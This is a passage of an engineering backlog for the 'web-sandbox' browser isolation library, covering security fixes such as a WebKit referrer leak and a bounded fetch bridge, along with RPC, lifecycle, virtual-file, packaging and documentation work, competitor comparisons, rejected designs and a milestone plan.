  directive and eight sample configs: the policy with the directive set to `[]` is never broader than
  with it left out. "Broader" means some directive's enforced sources, after the CSP Level 3 fallback
  chain (an absent `base-uri`, `form-action` or `frame-ancestors` being unrestricted), are not a subset;
  also `file-sources.test.ts`, `drop-self.test.ts`, `test/unit/host.test.ts`, `test/unit/files.test.ts`;
- e2e: `test/e2e/empty-directive.spec.ts` — with `connectionsAllowed: { 'default-src': [] }` an image
  and a fetch to a non-allowlisted origin are refused, each with its violation, in all three engines.

### S17 · WebKit shows a frame the guest creates the host page URL — **P1 · M** — open

*Found while doing S15.*

**Verified** (2026-10-13, WebKit 26.0 on Linux): guest code that creates
`<iframe referrerpolicy="unsafe-url" srcdoc="…">` reads, in that frame, `document.referrer` = the host
page URL without its fragment: path and query included. This holds with S15's base and no-referrer
measures in place, and whatever the host page's own referrer policy. WebKit takes the referrer of a
frame navigation from the first non-`srcdoc` document up the frame tree (`FrameLoader::outgoingReferrer`),
which is the host page, with no check for the opaque origins in between. Chromium and Firefox report
an empty referrer. `test/e2e/host-url.spec.ts` asserts the measured value, so a change shows up.

**Work**: make the walk stop before the host page, which means a wrapper that is not a `srcdoc`
document. A `data:` URL wrapper has an opaque origin and a URL that strips to no referrer, but it needs
`data:` in an embedder's `frame-src` and hits URL length limits (the bootstrap carries up to 8 MiB of
files); a host-made `blob:` URL inherits the host page's policy container. Measure both against S10,
S11 and the file tests before choosing; report upstream to WebKit in any case.

**Acceptance**: in WebKit, no frame the guest can create reads the host page's path or query.

## B · API Surface & DX

### B1 · Promise-based RPC in both directions — ✅ **done**

**Done**: built in-house rather than adopted; [ADR-002](ADR-002-host-guest-broker.md) records why.
One dispatcher, `src/lib/rpc.ts`, runs on both sides: `expose()`, `call()` and `callWithTimeout()`
on the element, and the same three on a global `bridge` in the guest. Only exposed methods are
callable, calls time out after 30 s by default, teardown rejects pending calls, and an answer
reaches only the frame that asked. `call()` needs no `scriptUnsafe`; `execute()` stays the gated escape hatch. The
acceptance below holds in both modes: `test/e2e/broker.spec.ts`, plus `src/lib/rpc.test.ts`.

*Parity gap*: `websandbox` (`connection.remote.fn()`), Penpal and Zoid all offer this; we do not.

**Verified**: `execute(code)` is fire-and-forget (`src/host.ts:119`); the in-sandbox script runs
`new Function(code)` and discards the return value (`src/lib/in-sandbox-script.ts:15`). Only `LOG`
frames travel back, so a caller cannot await a result and a thrown error arrives as a log line
rather than a rejected promise. The transport for this already exists — it is the framing that is
missing.

**Work**: **prefer adopting Penpal over hand-rolling this** — promise-based `postMessage`
correlation is a commodity, and our `MessageChannel` layer already provides the transport it
frames (see [ADR-001](ADR-001-continue-or-adopt.md#hybrid-strategy-adopt-the-commodity-keep-the-differentiator);
confirm licence compatibility first). If built in-house: a correlated `{id, type, payload}`
envelope over the existing port; `sandbox.call(name, ...args): Promise<T>` on the host and a
symmetric `host.call()` inside; keep `execute()` as the `scriptUnsafe`-gated escape hatch.

**Acceptance**: `await sandbox.call('sum', 1, 2) === 3`; a sandbox-side throw rejects with the
original message; identical behaviour in both modes.

### B2 · Lifecycle: `terminate()`, `reset()`, state — ✅ **done**

**Done**: `terminate(reason?)`, `reset()` and a readonly `state` (`idle`, `loading`, `ready`,
`terminated`) on the element, all transitions in one method that also dispatches `ready` and
`terminated`, so the events always agree with `state`. `terminated` fires once per termination;
`reset()` works from any state; removing the element tears it down (pending calls reject with
`TERMINATED`, state `idle`, no `terminated` event) and re-inserting rebuilds it. There is no
`running` state, since nothing reports when guest code finishes. The watchdog this item asked for
is S6's, done there. Decision in [ADR-003](ADR-003-lifecycle-and-liveness.md). Tests:
`test/e2e/lifecycle.spec.ts`, both modes.

**Verified**: teardown is private (`initialize()`, `_cleanupWorker()`); consumers have no
supported way to stop a runaway sandbox or to observe its state.

**Work**: public `terminate()` / `reset()`, a readonly state
(`idle → initializing → ready → running → terminated`), and the watchdog S6 needs. Supersedes the
state-machine sketch in `IMPROVEMENTS.md` §4 without the XState dependency.

**Acceptance**: `reset()` yields a fresh opaque origin; `terminated` fires exactly once.

### B3 · Per-instance events — fixes a live defect — ✅ **done**

**Done**: `sandbox-log` is dispatched on the element with `bubbles: true` (log lines and the worker
execution-timeout line). A listener on the element hears only its sandbox; a listener on `window`
still hears all of them, with the element as `event.target`, so no global mirror option was needed
([ADR-003](ADR-003-lifecycle-and-liveness.md)). `SandboxDevTools` listens on its element and prints
its sandbox's logs. Tests: `test/e2e/events.spec.ts` (two sandboxes, both modes; the timeout line;
DevTools output via a console spy in the host page).

**Verified**: logs dispatch on `window` (`src/host.ts:139`, `:156`, `:212`) while
`SandboxDevTools` filters `if (e.target !== this._sandbox) return;` (`src/devtools.ts:13`). The
target is always `window`, so **the filter drops every log and DevTools shows nothing**. Two
sandboxes on one page are also indistinguishable — which is why the playground listens globally
(`playground/playground.ts:78`) and why `test/e2e/local-html.spec.ts:30` works around it.

**Work**: dispatch `log` / `error` / `violation` / `terminated` on the element; keep a documented
opt-in global mirror for the playground.

**Acceptance**: with two sandboxes mounted, each receives only its own logs; DevTools output is
covered by a test.

### B4 · The library never registers its element — ✅ **done**

**Was**: `customElements.define(...)` appeared only in the playground, so a consumer importing the
bundle got an inert tag with no hint that registration was theirs to do.

**Done**: `defineWebSandbox(tagName = 'web-sandbox')` in `src/host.ts` registers the element,
is idempotent, and throws if the tag is taken by a different element. Importing still registers
nothing, so consumers can choose their own tag. The playground and the e2e harness use it.

**Open**: the D1 smoke test (mount a sandbox using only the public entry point) waits on D1.

### B5 · Host-mediated `sandbox.fetch` bridge — **P2 · M**

*Parity gap*: Zoid's strict bridge. *Motivated by* [finding 04](research/04_websocket_bypass/README.md)
(WebSockets bypass any SW-level logging) and [finding 09](research/09_monkey_patch_bypass/README.md)
(monkey-patching `fetch` is trivially undone).

**Current state**: no bridge. CSP controls *whether* a request is allowed but yields no record of
it, so the host has no traffic log.

**Work**: per `IMPROVEMENTS.md` §2 — expose `sandbox.fetch` over the port, default to
`connect-src 'none'` in bridged mode, polyfill `globalThis.fetch` onto it. Document the trade-off:
libraries reaching for a raw socket break, deliberately.

**Bridge discipline** — the bridge must grant no more than a direct guest request would. A
host-side `fetch` runs with the host page's authority, so by default it would send the host's
cookies, follow redirects past any allowlist, buffer without limit and outlive the call. Instead:

- `credentials: 'omit'` and `referrerPolicy: 'no-referrer'`; requests to the host page's own origin
  are refused unless allowlisted.
- `redirect: 'error'`.
- An exact-origin allowlist (v1 does not re-implement CSP source expressions).
- A body cap, read incrementally (`Content-Length` is checked first but never trusted).
- An `AbortController` tied to the call's timeout and to teardown.
- Loopback, private and link-local hosts (and `localhost` / `*.localhost`) refused unless
  allowlisted. A page cannot see DNS answers, so a public name that resolves to a private address
  is a documented limit, not a guarantee.
- Whole responses only in v1. If streaming is ever needed, it uses one dedicated port per request,
  so closing that port is the cancel — never chunk frames on the broker port.

**Acceptance**: every sandbox-initiated request appears in a host-side log; a direct `WebSocket`
is refused by CSP in bridged mode; a cookie set on the harness origin never reaches the echo
server; a redirect from an allowlisted origin to another origin is refused and the second origin
records no request; an oversized body rejects after reading at most the cap plus one chunk;
`reset()` during a slow response aborts the upstream request; every refusal carries a B7 code.

*Credit*: the no-redirect, timeout and size-cap discipline follows Dialog DB's `did:web` fetcher
([`dialog-did-web/src/fetch.rs`](https://github.com/dialog-db/dialog-db/blob/facd672/rust/dialog-did-web/src/fetch.rs));
the one-port-per-request stream shape follows Lunet
([`docs/lunet/data.js.flow`](https://github.com/Gozala/lunet/blob/master/docs/lunet/data.js.flow)).

### B6 · Content auto-sizing — **P2 · S**

*Parity gap*: the headline feature of `cross-origin-html-embed`; Zoid ships it too.
**Verified**: the iframe is pinned to `width:100%;height:100%` (`src/host.ts:224`).
**Work**: a `ResizeObserver` inside the sandbox reporting `scrollHeight` over the port, opt-in via
`autoResize`. **Acceptance**: host element height tracks content within one frame.

### B7 · Refusals carry a reason only the local side can set — ✅ **done**

**Done**: every rejection from the broker and from the element's `call()`/`callWithTimeout()` is an
`Error` with a `code` from the closed set below, minted in `src/lib/rpc.ts`; the element's own
termination refusals take theirs from the broker too. A guest throwing the host's termination text
with `code: 'TERMINATED'` rejects the host's call with `HANDLER_ERROR`. The decision
is recorded in [ADR-002](ADR-002-host-guest-broker.md#amendment-2026-10-11-refusals-carry-a-code).
The acceptance below holds in both modes: `test/e2e/broker.spec.ts` (refusals asserted by exact
code, guest-to-host ones from inside the guest), plus `src/lib/rpc.test.ts` (every code path,
forged response codes, and the pinned code strings).

**Guarantee**: nothing the other side sends can produce a rejection that looks like one of the
library's own (timeout, termination, non-transferable value, failed send).

**Verified**: every rejection is a plain `Error` carrying a string. A guest handler's error text
becomes the host's `Error.message` verbatim (`src/lib/rpc.ts:156`), and the library's own refusals
carry no marker (`src/host.ts:167`, `:173`, `:270`; `src/lib/rpc.ts:130`, `:189`). So a guest can
throw the exact text of a termination refusal, and host code that matches strings to decide
"stop" or "retry" acts on a reason the guest chose. Tests assert substrings (`rpc.test.ts:72`,
`broker.spec.ts:110`) or only that a call did not resolve (`broker.spec.ts:149`).

**Work**: one string `code` property on every rejection, from a closed set in two disjoint groups.
`TIMEOUT`, `TERMINATED`, `ARGS_NOT_TRANSFERABLE`, `SEND_FAILED` and `INVALID_CALL` are set only by
the local side. A failure reported by the other side gets `UNKNOWN_METHOD`, `HANDLER_ERROR` or
`RESULT_NOT_TRANSFERABLE`: the wire code is clamped on receipt, and anything else becomes
`HANDLER_ERROR`. `RPC_RES` gains an optional `code`. A plain property, not an `Error` subclass, so it survives the broker being stringified into
the guest and works across realms. Retry-or-stop follows from the code: only `TIMEOUT` is worth
retrying, and `TERMINATED` only after the next `ready`.

**Acceptance**: a guest response carrying `code: 'TERMINATED'`, or the termination text, rejects
the host's call with `code === 'HANDLER_ERROR'`. Every refusal test asserts the exact `code` rather
than message text, runs as the refused side (from inside the guest for guest-to-host refusals), and
asserts that no handler ran. One test pins the code strings, since they are wire protocol.

**Files** ([ADR-004](ADR-004-files-as-blob-urls.md)) use the same shape outside `RpcErrorCode`, since
no broker is involved: `registerFiles()` / `unregisterFiles()` throw `INVALID_PATH`, `INVALID_FILE` or
`FILES_QUOTA_EXCEEDED`, and the guest's `sandboxFiles` lookups throw or reject with `NOT_FOUND`, minted
in the guest. The strings are pinned in `src/lib/files.test.ts` and `test/e2e/files.spec.ts`.

*Credit*: typed refusal reasons, and the rule for testing refusals, come from Dialog DB
([`dialog-capability/src/access.rs`](https://github.com/dialog-db/dialog-db/blob/facd672/rust/dialog-capability/src/access.rs),
[`.claude/rules/authority-tests.md`](https://github.com/dialog-db/dialog-db/blob/facd672/.claude/rules/authority-tests.md)).
Their separate retry/stop field is not adopted: here it follows from the code.

---

## C · Virtual Files

Decided in [ADR-004](ADR-004-files-as-blob-urls.md): files are registered on the element and reach
the guest as `blob:` URLs created in its own realm. The Service-Worker hub is gone (Rejected, below).

### C1 · In-sandbox VFS API — 🟡 **read, list, url, markup references and modules done; CSS open**

**Done** (2026-10-13): the guest global `sandboxFiles` with `list()`, `url(path)`, `read(path)` and
`text(path)`, in iframe and worker mode, built by the bootstrap from a snapshot the host embeds as one
inline literal (`src/lib/in-sandbox-files.ts`). Host side: `registerFiles()`, `unregisterFiles()`,
`listFiles()` and `fileschanged` with `{ paths }` (`src/lib/files.ts`). Paths are validated, never
normalised, and the guest's lookup is an exact `Map` lookup, so every other spelling is `NOT_FOUND`.
Writes moved to C5. Tests: `src/lib/files.test.ts`, `src/lib/in-sandbox-files.test.ts`,
`test/unit/files.test.ts`, and `test/e2e/files.spec.ts` on Chromium, Firefox and WebKit (every load
type, containment, isolation, no egress, lifecycle, worker mode).

**Done** (2026-10-13), markup references: `<script src>`, stylesheet/icon/preload/modulepreload
links, `src` of `img`/`source`/`video`/`audio`/`track` and `video[poster]` in guest markup that
resolve, against `https://vfs.invalid/index.html`, to a registered path. Host-side `DOMParser` rewrite
to per-build sentinels (`src/lib/markup-references.ts`); the bootstrap `document.write`s the markup
with the guest's own `blob:` URLs as its last statement, keeping parser order and the CSP-first rule
(S2). No match keeps the markup verbatim (byte-identical document); a query or fragment, another
spelling or an unregistered path stays as written and fails closed with no request. Iframe mode only,
and only when the bootstrap can run. Rejected: `<base href>`, a `MutationObserver` swap, inlining
contents, a guest-side parser. Decisions and fidelity notes: [ADR-004, amendment](ADR-004-files-as-blob-urls.md#amendment-markup-references-2026-10-13).
Tests: `src/lib/markup-references.test.ts`, `test/unit/files.test.ts`, `test/e2e/files.spec.ts`
section 8 on all three engines.

**Done** (2026-10-13), module graph: relative specifiers (`./`, `../`, `/`) in static imports,
`export … from`, `export * from`, side-effect imports and literal `import()` of registered JavaScript
files are rewritten at registration, host-side, to `https://vfs.invalid/<path>` URLs
(`src/lib/module-specifiers.ts`), with es-module-lexer's asm.js build (`es-module-lexer/js`: sync, no
WebAssembly), pinned at 1.7.0 as a dev dependency and bundled into `dist` (owner-approved; MIT notice in
`THIRD_PARTY_NOTICES.md`). Inline `<script type="module">` in guest markup is rewritten the same way.
The bootstrap registers exactly one import map from those URLs to the guest's `blob:` URLs before any
markup, so a module reached by `blob:` URL and by virtual URL is evaluated once; a guest inline import
map is merged into it on the host and taken out of the markup (`src/lib/import-map.ts`), so it behaves
the same in every engine. `read()`/`text()` return the bytes as registered (the rewrite travels as byte
edits); the quota counts what the rewrite adds. Computed `import()`, `new URL(…, import.meta.url)`,
module workers and module graphs in worker mode stay unsupported and fail closed; a file the lexer
cannot parse is delivered unchanged with a warning. Decisions: [ADR-004, module graph amendment](ADR-004-files-as-blob-urls.md#amendment-module-graph-2026-10-13).
Tests: `src/lib/module-specifiers.test.ts`, `src/lib/import-map.test.ts`, `src/lib/files.test.ts`,
`src/lib/in-sandbox-files.test.ts`, `src/lib/markup-references.test.ts`, `test/unit/files.test.ts`,
`test/e2e/files.spec.ts` section 9 on all three engines.

**Open**:
- **CSS** (PR4) — `url()` and `@import` inside registered stylesheets and `<style>`, and `srcset`.

**Verified** (2026-08-29, kept as a record): one-way only. The host pushed with `registerFiles()`;
sandboxed code could *load* files through the `<base>` tag but could not list, read or write them.
[`RESEARCH_VFS_ACCESS.md`](research/RESEARCH_VFS_ACCESS.md) specified the API.

**Acceptance**: sandboxed code reads and lists files. Containment: `list()` returns only this
instance's entries, with guest-relative names (no session id, host path or other instance's names); a
read through `../`, an encoded traversal, an absolute path or another instance's path rejects with the
same code as a missing file, and the store is unchanged. This inherits S3's cross-instance guarantee.
Met for reads; the write half is C5's.

*Credit*: the guest sees only what it was granted, never names or origins — Lunet's data model
([Readme](https://github.com/Gozala/lunet#readme)). Its encryption at rest is not adopted: with the
key stored beside the data on the same origin, it protects nothing.

### C2 · MIME types and binary files — ✅ **done**

**Done** (2026-10-13): a case-insensitive extension table of about 30 types, never empty (unknown is
`application/octet-stream`: an empty type is applied as a stylesheet by every engine), with a
`{ content, type }` override checked against a `type/subtype` pattern. Strings are stored as UTF-8
and `Uint8Array`s are copied at registration. The guest's blobs carry the type, and `files.spec.ts`
asserts each blob's type against the table and a byte-exact round trip of all 256 byte values.

**Verified** (kept as a record), two defects in `src/virtual-files/sw.ts`: every response was served
as `text/javascript`, and `fileCache` was a `Map<string, string>` although `registerFiles()`
advertised `Record<string, string | Uint8Array>`. Binary registration was broken at the type boundary.

### C3 · File lifecycle and cap — ✅ **done**

**Done** (2026-10-13): files belong to the element and live until `unregisterFiles()` or garbage
collection; each environment build snapshots them. The guest's blobs belong to its document or
worker, so teardown — `reset()`, `terminate()`, removal — destroys the realm and frees them; there is
no session state left behind anywhere. The cap is enforced atomically in `registerFiles()` against
the store the batch would produce: 8 MiB in total, at most 1000 files, paths of at most 256
characters, as module constants. Measured on 2026-10-13 to load byte-exact in all three engines in
both modes (they also loaded 64 MiB, with time to `ready` growing to 4.6–17 s); raise the constants
only after `files.spec.ts` section 7 passes at the new value everywhere. Memory is about 3–3.5× the
file bytes across host and guest.

*The lesson of [finding 08](research/08_session_exhaustion/README.md), applied client-side.*
**Verified** (kept as a record): `fileCache` grew without bound and was never pruned; entries keyed by
a dead session id outlived the sandbox for the Service Worker's lifetime.

### C5 · Guest writes — **P2 · M**

**Guarantee**: a guest can change files only when the embedder opted in, and never past the host's
path rules and cap.

**Work**: an opt-in `FS_WRITE` frame on the port, handled before the broker (like the watchdog's
`PING`), so it is not a callable method a guest could replace. The host validates the path and the
quota exactly as `registerFiles()` does. The guest's writes form an overlay that `reset()` discards
unless the host commits it. Opt-in, because otherwise a guest could plant code that the next
environment runs.

**Acceptance**: without the opt-in, a write rejects and the store is unchanged; with it, a write
through `../`, an encoded path or past the cap is refused with the same codes as `registerFiles()`;
an uncommitted overlay is gone after `reset()`, and a committed one fires `fileschanged`.

---

## D · Packaging & Distribution

### D1 · Ship an installable package — 🟡 **ready except the licence**

**Done**: public entry `src/index.ts`; `exports` / `types` / `main` point at `dist/`, built by
`bun run build:lib` (bun bundle + `tsc` declarations). `scripts/smoke-package.sh` runs `bun pm pack`,
installs the tarball into a scratch project, type-checks and bundles a consumer (CI). The e2e spec
`test/e2e/package.spec.ts` mounts a sandbox from `dist/` under a custom tag. **Open**: `private: true`
stays until H5's licence is chosen.

Every solution we compare against installs with one command. We do not install at all, which caps
adoption regardless of how good the isolation is.

**Verified in `package.json`**: `"private": true`; `"main": "dev-server.ts"` — **a file that does
not exist**; no `exports`, no `types`; `build-dist` emits JS without declarations. `README.md`
also documents a `server.ts` that does not exist (the dev server is a Vite plugin in
`vite.config.ts`).

**Work**: drop `private`, add `exports` + `types` with declaration emit, fix `main`, align the
README with the real entry points.

**Acceptance**: a packed tarball imports cleanly in a scratch project with working types, and a
smoke test mounts a sandbox through the public entry point (with B4).

### D2 · CI — ✅ **done**

**Done**: `.github/workflows/ci.yml` runs unit tests and both builds, and the e2e suite on Chromium,
Firefox and WebKit, on push to `main` and on every PR. The type check now gates CI too (H3).

**Verified**: `playwright.config.ts` defines chromium, firefox and webkit projects and
[`BROWSER_COMPATIBILITY.md`](research/BROWSER_COMPATIBILITY.md) makes claims about all three — but
there is no `.github/` directory, so nothing runs on merge. This is what allowed T1–T3 to rot
undetected.

**Work**: a workflow running unit + e2e (+ `tsc --noEmit` once H3 lands) on push and PR.
**Acceptance**: reverting any mitigation fails the PR. Order this immediately after T1–T3, or the
same drift recurs.

### D3 · API reference and adapters — **P3 · M**

Document the public surface once B1–B4 stabilise it; thin React/Vue wrappers around the element.
**Acceptance**: a consumer can integrate from the docs without reading `host.ts`.

---

## H · Repo & Docs Hygiene

### H1 · Duplicate documents — ✅ **done**

**Done**: `research/ARCHITECTURE_COMPARISON.md` and `research/VIRTUAL_FILES_SECURITY_ANALYSIS.md` are
kept; their byte-identical twins are now stubs pointing at them. The VFS overlap below remains.

**Verified byte-identical pairs**:
- `docs/research/VIRTUAL_FILES_SECURITY_ANALYSIS.md` ≡ `docs/research/Virtual-Files-Security-Architecture.md`
- `docs/Sandbox_Architecture_Decision.md` ≡ `docs/research/ARCHITECTURE_COMPARISON.md`

Plus heavy overlap between `VFS_ARCHITECTURE.md`, `VIRTUAL_FILES_PLAN.md` and
`RESEARCH_VFS_ACCESS.md`. **Work**: keep one of each pair, leave a stub pointing at it.

### H2 · Naming drift — ✅ **done**

**Was**: four names for one project — `lofi-sandbox` (the element), `lofi-web-sandbox` (the package),
`iframe-sandbox` (older docs) and "Lofi Sandbox" (prose).

**Done**: one name, **web-sandbox**: the repository, the package, the default element
`<web-sandbox>` and the class `WebSandbox`; "Web Sandbox" in prose. `iframe-sandbox` remains only
in research write-ups that describe that older architecture.

### H3 · Type check is not part of the build — ✅ **done**

**Done**: `bun run typecheck` is clean and gates CI. The playground's `window` surface is typed,
`sw.ts` has its own `tsconfig.worker.json`, `test/` and the research specs are included, `baseUrl` is
gone (TypeScript 7 removed it), and the `CSPDirectives` test import is fixed. Fixing the types also
surfaced that `setConfig()` demanded a complete config; it now takes `Partial<SandboxConfig>`.

**Verified**: `bun x tsc --noEmit` reports 91 errors — 84 in `playground/playground.ts` (untyped
`window.*` globals, unasserted `querySelector`), 6 in `sw.ts` (needs `lib: ["WebWorker"]`), and one
real bug: `src/lib/csp/csp-generator.test.ts:2` imports `CSPDirectives` from `./csp-generator`,
which does not export it. `src/host.ts` itself is clean. `tsconfig.json` also excludes `test/**`
from `include`, and `baseUrl` is deprecated for TS 7.

**Work**: type the playground's window surface, split a worker tsconfig for `sw.ts`, fix the test
import, include `test/`, replace `baseUrl` with relative paths. **Acceptance**: `tsc --noEmit` is
clean and runs in CI.

### H4 · Research index — ✅ **done**

`docs/research/README.md` now indexes all twelve findings with a per-finding status against the
current opaque-origin architecture, distinguishing "closed by construction" from "open". A
`docs/README.md` index was added alongside it.

### H5 · Missing repo basics — 🟡 **partly done**

**Done**: `CONTRIBUTING.md`; `format` / `format:check` scripts; `.prettierrc` stripped of the Svelte
and Tailwind plugins it was copied with. `format:check` is not a CI gate yet (101 files predate the
config). **Open**: the `LICENSE` — the owner's choice, and it still blocks dropping `private` (D1).

No `LICENSE`, no `CONTRIBUTING.md`, and `.prettierrc` exists with no `format` script and no
formatting check. **Work**: add a license (blocks D1 — publishing without one is a non-starter),
a short contributing note, and `format` / `format:check` scripts.

---

## Parity Reference

Where the items above come from. This table covers the solutions named in the repo's original
comparisons; for the 2026 entrants (`quickjs-wasi`, `@tanstack/ai-isolate-quickjs`, `zushi`,
`lifo`, BrowserPod) see the
[field scan in ADR-001](ADR-001-continue-or-adopt.md#field-scan--august-2026). Legend: ✅ shipped · 🟡 partial · ❌ missing · ➖ n/a by design.

| Capability | web-sandbox | websandbox | Penpal | Zoid | cross-origin-embed |
| :--- | :---: | :---: | :---: | :---: | :---: |
| Isolation with no server config | ✅ opaque origin | 🟡 | ➖ | ➖ | ❌ wildcard DNS |
| Private `MessageChannel` | ✅ | ❌ | 🟡 | ✅ | ❌ |
| Promise-based RPC | ✅ **B1** | ✅ | ✅ | ✅ | ➖ |
| Typed package / `d.ts` | 🟡 **D1** | ✅ | ✅ | ✅ | ✅ |
| Headless (worker) execution | ✅ **S1** | ❌ | ❌ | ❌ | ❌ |
| Virtual files | 🟡 **C1** | ❌ | ➖ | ❌ | ❌ |
| Host-mediated network | ❌ **B5** | ❌ | ➖ | ✅ | ❌ |
| Auto-sizing | ❌ **B6** | ❌ | 🟡 | ✅ | ✅ |
| Execution quotas | 🟡 **S6** | ❌ | ➖ | ❌ | ➖ |

We lead on four rows: isolation without server config and headless (worker) execution outright,
and virtual files and execution quotas as the only solution with even partial support. Those four,
plus the private channel (matched only by Zoid), are the rows the backlog must not regress.

Larger bets that follow from the same comparison, both **P3**: an **opt-in host-served mode** that
delivers CSP as an HTTP **header** while keeping the opaque origin via the `sandbox` attribute —
which closes S7, S8 and most of S2 at once, and needs no wildcard DNS (see
[ADR-001](ADR-001-continue-or-adopt.md); note this is *not* the unique-origin model, which is a
downgrade on the origin axis); and
a **logic tier evaluation** (upgraded from a speculative spike): as of the
[2026-08 field scan](ADR-001-continue-or-adopt.md#field-scan--august-2026) this is a solved,
MIT-licensed commodity — evaluate [`vercel-labs/quickjs-wasi`](https://github.com/vercel-labs/quickjs-wasi)
(VM snapshot/restore, which also serves B2's `reset()`) and `@tanstack/ai-isolate-quickjs`, with
[`reearth/zushi`](https://github.com/reearth/zushi) as the reference for how a QuickJS logic tier
meets an opaque-origin UI tier. Do not write a JS engine.

---

## Rejected / Out of Scope

| Proposal | Source | Why not |
| :--- | :--- | :--- |
| Wildcard DNS + SSL as the **default** | `cross-origin-html-embed` | Destroys the local-first property, the one thing no competitor offers. Opt-in only. |
| Iframe-scoped Service Worker ("hub" model) | Considered internally | Needs a sandbox origin that can register SWs, re-opening privilege escalation. See [`ARCHITECTURE_COMPARISON.md`](research/ARCHITECTURE_COMPARISON.md). |
| Service-Worker VFS (host-level hub) | The original virtual-files design | Never served a file: the opaque-origin `srcdoc` guest is never a client of any Service Worker. The worker was also served as untranspiled TypeScript, partitioned as a third-party iframe, and lost files sent before it loaded. Replaced by guest-realm blob URLs, [ADR-004](ADR-004-files-as-blob-urls.md). |
| Service Worker update integrity (was C4) | [`SW-verify-before-update.md`](research/SW-verify-before-update.md) | No Service Worker is left to protect (ADR-004). |
| `allow-same-origin` for API compatibility | `websandbox` | Root cause of findings 01, 02 and 05. Enforced by T2's deny-list test. |
| Agent runtime in the trusted base | [`RESEARCH_SANDBOXING.md`](research/RESEARCH_SANDBOXING.md) | Keep the base dumb; agents load as user code so their bugs stay inside the sandbox. |
| BrowserPod / CheerpX as a dependency | [2026-08 field scan](ADR-001-continue-or-adopt.md#field-scan--august-2026) | Proprietary licence — free only for personal and open-source use. Disqualified as a dependency. |
| Building a full OS / Linux tier | Same | BrowserPod and `lifo` are years ahead, and it is not this project's problem. |
| Writing our own JS engine / VM tier | Same | `quickjs-wasi` and `@tanstack/ai-isolate-quickjs` are MIT and maintained. Adopt, don't build. |
| Nonce-based CSP instead of `'unsafe-inline'` | General best practice | No benefit under an opaque origin with immutable `srcdoc` CSP — [`CSP_CONFIG_RATIONALE.md`](CSP_CONFIG_RATIONALE.md) §3. |
| App identity from a hash of the source | [Lunet](https://gozala.io/lunet) | The embedder already knows what it loaded; two tenants with identical code would share storage, and any edit loses the data. If storage needs scoping, the embedder passes a namespace. |
| Declarative argument rules per method (UCAN policy) | [Dialog DB](https://github.com/dialog-db/dialog-db) | In UCAN a third party writes the policy; here the embedder writes both policy and handler, so checking arguments in code is strictly more expressive. |
| Method-first names so read-only is a prefix | Dialog DB | There are no grants to narrow; an exposed name is the whole grant. |
| UCAN delegation between host and guest | Dialog DB | One host, one guest, no third party: holding the one-shot port already is the authority. Would add keys, signatures and a clock to a self-contained broker. |
| Server-side session quotas (rate limit, TTL, LRU) | [Finding 08](research/08_session_exhaustion/README.md), `IMPROVEMENTS.md` §1 | The local-first architecture has no server. Becomes P1 the moment a hosted mode ships; recorded so the requirement is not lost with the server that was removed. |

---

## Already Done

So `IMPROVEMENTS.md` is not re-proposed wholesale:

- **`MessageChannel` communication** (§3) — `setupChannel()` (`src/host.ts:150`), both modes.
- **Promise-based RPC, both directions** — `src/lib/rpc.ts` over the same channel, both modes (B1).
- **CSP generation from typed config** — `src/lib/csp/csp-generator.ts`, hardened with a
  `default-src 'none'` fallback and 12 passing unit tests.
- **Opaque origin via `srcdoc`** — closes findings 03 and 05 by construction.
- **Headless worker mode** — isolated inside the sandbox frame since S1.
- **Lifecycle state machine** (§4) — `state`, `terminate()` and `reset()` on the element, without
  the XState dependency (B2).
- **Virtual files** — guest-realm blob URLs through `sandboxFiles`, both modes (C1–C3, ADR-004).

---

## Suggested Order

| Milestone | Items | Why in this order |
| :--- | :--- | :--- |
| **M1 · Turn the lights on** | T1, T2, T3, D2 | Until the suite runs, no security claim is verified and no later change is safe. CI belongs here so the same drift cannot recur. |
| **M2 · Make the claims true** | S1, S2, S7, S9, D1, B3, B4 | A documented capability that does not hold (S1) or does not install (D1) costs more than a missing one. B3/B4 ride along — DevTools is silent and the element self-registers nowhere. |
| **M3 · Harden** | S3, S4, S13, S15, S16, T4, T5, H3 | The injection path and the session-id model are the two places where the design's assumptions are unverified; presets and type checking keep them that way. S13 is a candidate egress route that CSP does not cover. S15 leaks the host page's URL to the guest; S16 lets a config meant to deny widen the policy. |
| **M4 · Make it adoptable** | B1, B7, B2, C1, C2 | RPC + lifecycle is the parity bar set by websandbox and Penpal; B7 makes RPC failures safe to branch on; the VFS is the differentiator, so it must actually work. |
| **M5 · Extend** | B5, B6, C3, C5, S5, S6, D3, H1, H2, H5 | Observability, quotas, docs and hygiene once the base is trustworthy. |
| **Bets** | hosted-origin mode, QuickJS spike | Independent; run when there is slack. |
